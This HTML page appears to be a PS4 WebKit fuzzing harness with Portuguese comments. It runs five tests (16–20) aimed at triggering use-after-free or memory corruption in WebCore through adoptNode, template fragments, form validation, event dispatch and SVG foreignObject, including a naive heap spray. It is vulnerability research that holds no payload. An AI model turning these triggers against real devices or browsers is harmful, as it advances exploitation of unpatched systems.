
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fuzzing - Vetores DOM Isolados</title>
</head>
<body>
    <h1>Testes de Corrupção WebCore - Lote 4</h1>
    <div id="log-container"></div>

    <script>
        function logMsg(msg) {
            console.log(msg);
            let p = document.createElement("p");
            p.innerText = msg;
            document.getElementById("log-container").appendChild(p);
        }

        // Teste 16: Adoção Cruzada de Nós (Cross-Document AdoptNode UAF)
        // Cria um documento virtual em memória, extrai um nó dele e destrói o documento origem.
        // O WebCore pode falhar ao atualizar os ponteiros de contexto (Document pointer) do nó órfão.
        function test16() {
            logMsg("Iniciando Teste 16 (Cross-Document AdoptNode)...");
            try {
                let doc = document.implementation.createHTMLDocument("fuzz_doc");
                let orphanNode = doc.createElement("div");
                doc.body.appendChild(orphanNode);
                
                // Quebra a referência do documento original para forçar a coleta
                doc = null; 
                
                // Força um spray rápido para ocupar a memória do documento destruído
                let spray = new Array(1000).fill(new ArrayBuffer(128));
                
                // Tenta adotar o nó cujo documento pai "não existe" mais
                document.body.appendChild(document.adoptNode(orphanNode));
            } catch(e) {}
            logMsg("Fim do Teste 16.");
        }

        // Teste 17: Corrupção de Fragmento via HTMLTemplateElement
        // A tag <template> armazena nós em um DocumentFragment isolado no C++.
        // Esvaziar o template enquanto manipulamos um filho direto pode vazar a referência.
        function test17() {
            logMsg("Iniciando Teste 17 (Template Fragment UAF)...");
            try {
                let tpl = document.createElement("template");
                let frag = tpl.content; // Aponta para o DocumentFragment interno
                let span = document.createElement("span");
                frag.appendChild(span);
                
                // Oblítera o conteúdo do template via parser HTML interno
                tpl.innerHTML = "";
                
                // Tenta interagir com o filho que estava atrelado ao fragmento destruído
                span.appendChild(document.createElement("b"));
            } catch(e) {}
            logMsg("Fim do Teste 17.");
        }

        // Teste 18: Quebra de Iterador em Validação Síncrona de Formulário
        // O WebCore usa um iterador nativo para varrer os elementos do form durante o checkValidity().
        // Remover um elemento vizinho durante esse loop síncrono causa desvio de ponteiro.
        function test18() {
            logMsg("Iniciando Teste 18 (Form Validation Iterator Race)...");
            try {
                let form = document.createElement("form");
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                input1.required = true;
                input2.required = true;
                
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);

                // Quando o C++ estiver validando o input1, nós destruímos o input2 da memória
                input1.addEventListener("invalid", () => {
                    input2.remove();
                });
                
                // Dispara o loop em C++
                form.checkValidity();
            } catch(e) {}
            logMsg("Fim do Teste 18.");
        }

        // Teste 19: Vetor de Propagação de Eventos (Event Path UAF)
        // Quando um evento é disparado, o WebCore cria um array nativo (Event Path) com os nós.
        // Destruir o nó alvo de dentro do seu próprio manipulador corrompe esse vetor.
        function test19() {
            logMsg("Iniciando Teste 19 (Event Path Propagation UAF)...");
            try {
                let btn = document.createElement("button");
                document.body.appendChild(btn);
                
                btn.addEventListener("fuzzEvent", (e) => {
                    // Remove o nó da árvore DOM
                    btn.remove();
                    
                    // Tenta acessar o caminho do evento, que agora contém um ponteiro liberado
                    let path = e.composedPath(); 
                });
                
                // Despacha um evento customizado borbulhante
                btn.dispatchEvent(new Event("fuzzEvent", {composed: true, bubbles: true}));
            } catch(e) {}
            logMsg("Fim do Teste 19.");
        }

        // Teste 20: SVG foreignObject Tree Mutation
        // Elementos foreignObject permitem injetar HTML normal dentro do pipeline rigoroso do SVG.
        // Remover a raiz SVG enquanto se manipula o nó HTML interno causa anomalias de layout.
        function test20() {
            logMsg("Iniciando Teste 20 (SVG foreignObject Mutation)...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
                let div = document.createElement("div");
                
                foreign.appendChild(div);
                svg.appendChild(foreign);
                document.body.appendChild(svg);
                
                // Remove o contêiner SVG inteiro
                svg.remove();
                
                // Força o motor a recalcular o layout do nó HTML que estava no contexto SVG
                div.innerHTML = "<b>trigger layout</b>";
                let forceLayout = div.offsetHeight; 
            } catch(e) {}
            logMsg("Fim do Teste 20.");
        }

        // Execução Sequencial
        setTimeout(() => { test16(); }, 500);
        setTimeout(() => { test17(); }, 1500);
        setTimeout(() => { test18(); }, 2500);
        setTimeout(() => { test19(); }, 3500);
        setTimeout(() => { test20(); }, 4500);

    </script>
</body>
</html>
